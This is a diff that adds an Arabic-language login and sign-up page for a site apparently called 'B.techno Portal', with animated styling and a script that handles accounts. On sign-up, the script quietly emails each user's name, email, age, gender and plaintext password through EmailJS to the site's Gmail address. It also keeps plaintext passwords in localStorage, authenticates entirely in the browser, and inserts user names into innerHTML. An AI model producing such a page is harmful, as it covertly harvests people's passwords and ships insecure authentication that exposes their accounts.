@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>B.techno Portal - تسجيل الدخول</title>
+
+<style>
+*{box-sizing:border-box;font-family:'Cairo',sans-serif;margin:0;padding:0;}
+body{
+  margin:0;
+  height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  background:url("https://images.unsplash.com/photo-1518770660439-4636190af475") no-repeat center fixed;
+  background-size:cover;
+  position:relative;
+  overflow:hidden;
+  color:#fff;
+}
+
+.bg{
+  position:absolute;
+  inset:0;
+  background:
+    linear-gradient(rgba(2,6,23,0.75),rgba(2,6,23,0.85)),
+    url("https://images.unsplash.com/photo-1518770660439-4636190af475");
+  background-size:cover;
+  background-position:center;
+  z-index:-2;
+  animation:floatBg 20s infinite alternate ease-in-out;
+}
+
+@keyframes floatBg{
+  from{transform:scale(1) translateY(0);}
+  to{transform:scale(1.1) translateY(-20px);}
+}
+
+.card{
+  background:rgba(2,6,23,0.85);
+  padding:30px 25px;
+  border-radius:22px;
+  width:100%;
+  max-width:420px;
+  text-align:center;
+  box-shadow:0 0 60px rgba(168,85,247,0.6);
+  animation:floatCard 4s infinite ease-in-out;
+  position:relative;
+}
+
+@keyframes floatCard{
+  0%,100%{transform:translateY(0);}
+  50%{transform:translateY(-12px);}
+}
+
+.logo{
+  font-size:34px;
+  font-weight:800;
+  background:linear-gradient(135deg,#38bdf8,#facc15,#a855f7);
+  -webkit-background-clip:text;
+  -webkit-text-fill-color:transparent;
+  margin-bottom:10px;
+  text-shadow:0 0 25px rgba(168,85,247,0.8);
+}
+
+input{
+  width:100%;
+  padding:14px;
+  margin:10px 0;
+  border-radius:12px;
+  border:none;
+  background:#020617;
+  color:white;
+  font-size:15px;
+  box-shadow:inset 0 0 12px rgba(168,85,247,0.4);
+}
+
+button{
+  width:100%;
+  padding:14px;
+  margin-top:15px;
+  border:none;
+  border-radius:12px;
+  background:linear-gradient(135deg,#facc15,#38bdf8);
+  color:#020617;
+  font-size:16px;
+  font-weight:bold;
+  cursor:pointer;
+  transition:0.3s;
+}
+button:hover{
+  transform:scale(1.07);
+  box-shadow:0 0 30px rgba(250,204,21,0.9);
+}
+
+.toggle-form{
+  margin-top:12px;
+  font-size:14px;
+  color:#facc15;
+  cursor:pointer;
+}
+
+.spark{
+  position:fixed;
+  width:6px;
+  height:6px;
+  background:radial-gradient(circle,#facc15,#a855f7);
+  border-radius:50%;
+  pointer-events:none;
+  animation:fade 1s forwards;
+}
+@keyframes fade{
+  to{opacity:0; transform:scale(2);}
+}
+
+.toast{
+  position:fixed;
+  top:30px;
+  left:50%;
+  transform:translateX(-50%);
+  background:linear-gradient(135deg,#ff5252,#ff1744);
+  color:#fff;
+  padding:12px 20px;
+  border-radius:25px;
+  font-weight:bold;
+  box-shadow:0 8px 25px rgba(0,0,0,0.4);
+  opacity:0;
+  pointer-events:none;
+  transition:0.5s;
+  z-index:9999;
+}
+.toast.show{opacity:1;}
+</style>
+</head>
+
+<body>
+<div class="bg"></div>
+
+<div class="card" id="authCard">
+  <div class="logo">B.techno</div>
+  <p id="formTitle">تسجيل الدخول إلى حسابك</p>
+
+  <form id="authForm">
+    <input type="text" id="name" placeholder="الاسم" style="display:none;">
+    <input type="text" id="gender" placeholder="النوع" style="display:none;">
+    <input type="number" id="age" placeholder="السن" style="display:none;">
+    <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+    <input type="password" id="password" placeholder="كلمة المرور" required>
+    <button type="submit" id="submitBtn">دخول</button>
+  </form>
+
+  <div class="toggle-form" id="toggleForm">ليس لديك حساب؟ إنشاء حساب</div>
+</div>
+
+<div id="toast" class="toast"></div>
+
+<!-- EmailJS -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+  emailjs.init("3pBE5P5gfa6PPk2Wu");
+</script>
+
+<script>
+const authForm = document.getElementById("authForm");
+const toggleForm = document.getElementById("toggleForm");
+const formTitle = document.getElementById("formTitle");
+const submitBtn = document.getElementById("submitBtn");
+const toast = document.getElementById("toast");
+
+const nameInput = document.getElementById("name");
+const genderInput = document.getElementById("gender");
+const ageInput = document.getElementById("age");
+
+let isSignUp = false;
+let accounts = JSON.parse(localStorage.getItem("accounts")) || [];
+
+// إرسال الإيميل
+function sendAuthEmail(type, name, email, gender="", age="", password=""){
+  emailjs.send(
+    "service_al1b7s2",
+    "template_4a7un8j",
+    {
+      to_name: name,
+      to_email: email, // المستخدم عشان يظهر في Content
+      action: type === "signup" ? "إنشاء حساب جديد" : "تسجيل دخول",
+      message: type === "signup"
+        ? `تم إنشاء حساب جديد
+الاسم: ${name}
+البريد الإلكتروني: ${email}
+النوع: ${gender}
+السن: ${age}
+كلمة المرور: ${password}`
+        : `تم تسجيل دخول
+الاسم: ${name}
+البريد الإلكتروني: ${email}
+النوع: ${gender}
+السن: ${age}`
+    }
+  ).then(
+    ()=>console.log("✅ Email Sent"),
+    err=>console.error("❌ Email Error", err)
+  );
+}
+
+
+
+
+// spark effect
+document.addEventListener("mousemove", e=>{
+  const s=document.createElement("div");
+  s.className="spark";
+  s.style.left=e.clientX+"px";
+  s.style.top=e.clientY+"px";
+  document.body.appendChild(s);
+  setTimeout(()=>s.remove(),1000);
+});
+
+// toast function
+function showToast(msg){
+  toast.innerText = msg;
+  toast.classList.add("show");
+  setTimeout(()=>toast.classList.remove("show"),3000);
+}
+
+// تبديل بين تسجيل دخول / إنشاء حساب
+toggleForm.addEventListener("click", ()=>{
+  isSignUp = !isSignUp;
+  if(isSignUp){
+    formTitle.innerText = "إنشاء حساب جديد";
+    submitBtn.innerText = "إنشاء حساب";
+    toggleForm.innerText = "لديك حساب؟ تسجيل الدخول";
+    nameInput.style.display="block";
+    genderInput.style.display="block";
+    ageInput.style.display="block";
+    nameInput.required = true;
+    genderInput.required = true;
+    ageInput.required = true;
+  }else{
+    formTitle.innerText = "تسجيل الدخول إلى حسابك";
+    submitBtn.innerText = "دخول";
+    toggleForm.innerText = "ليس لديك حساب؟ إنشاء حساب";
+    nameInput.style.display="none";
+    genderInput.style.display="none";
+    ageInput.style.display="none";
+    nameInput.required = false;
+    genderInput.required = false;
+    ageInput.required = false;
+  }
+});
+
+// دالة رسالة الترحيب الاحترافية
+function showWelcomeMessage(name, callback){
+  const bubble = document.createElement("div");
+  bubble.style.position = "fixed";
+  bubble.style.top = "50%";
+  bubble.style.left = "50%";
+  bubble.style.transform = "translate(-50%, -50%)";
+  bubble.style.background = "linear-gradient(135deg,#38bdf8,#facc15,#a855f7)";
+  bubble.style.padding = "25px 40px";
+  bubble.style.borderRadius = "25px";
+  bubble.style.color = "#020617";
+  bubble.style.fontSize = "22px";
+  bubble.style.fontWeight = "700";
+  bubble.style.boxShadow = "0 0 40px rgba(168,85,247,0.7)";
+  bubble.style.zIndex = "9999";
+  bubble.style.opacity = "0";
+  bubble.style.textAlign = "center";
+  bubble.style.transition = "opacity 0.5s, transform 0.5s";
+  bubble.innerHTML = `🎉 مرحباً <span style="color:#A52A2A
+">${name}</span>!<br>تم تسجيل الدخول بنجاح`;
+
+  document.body.appendChild(bubble);
+
+  // ظهور الرسالة
+  setTimeout(()=>{
+    bubble.style.opacity = "1";
+    bubble.style.transform = "translate(-50%, -50%) scale(1.05)";
+  },50);
+
+  // اختفاء الرسالة بعد ثانيتين
+  setTimeout(()=>{
+    bubble.style.opacity = "0";
+    bubble.style.transform = "translate(-50%, -50%) scale(0.9)";
+    setTimeout(()=>{
+      bubble.remove();
+      callback();
+    },500);
+  },2000);
+}
+
+// معالجة الفورم
+authForm.addEventListener("submit", e=>{
+  e.preventDefault();
+  const email = document.getElementById("email").value.trim();
+  const password = document.getElementById("password").value.trim();
+  const name = nameInput.value.trim();
+  const gender = genderInput.value.trim();
+  const age = ageInput.value.trim();
+
+ if(isSignUp){
+  if(accounts.some(acc=>acc.email===email)){
+    showToast("هذا البريد مسجل بالفعل ❌");
+    return;
+  }
+
+  accounts.push({
+  name,
+  gender,
+  age,
+  email,
+  password,
+  balance: 0,
+  totalProfit: 0,
+  lastDaily: 0
+});
+
+  localStorage.setItem("accounts", JSON.stringify(accounts));
+  localStorage.setItem("currentUser", JSON.stringify({name,email}));
+
+  // ✅ إرسال إيميل إشعار على btechno1010@gmail.com
+  sendAuthEmail("signup", name, email, gender, age, password);
+
+
+  showWelcomeMessage(name, ()=>{
+    window.location.href="Btechno2.html";
+  });
+
+}else{
+  const user = accounts.find(acc=>acc.email===email);
+  if(!user){ showToast("البريد الإلكتروني غير موجود ❌"); return; }
+  if(user.password!==password){ showToast("كلمة المرور خاطئة ❌"); return; }
+
+  localStorage.setItem(
+  "currentUser",
+  JSON.stringify({ email: user.email })
+);
+
+
+  // ✅ إرسال إيميل إشعار على btechno1010@gmail.com
+  sendAuthEmail("login", user.name, user.email, user.gender, user.age, user.password);
+
+
+  showWelcomeMessage(user.name, ()=>{
+    window.location.href="Btechno2.html";
+  });
+}
+
+});
+</script>
+</body>
+</html>
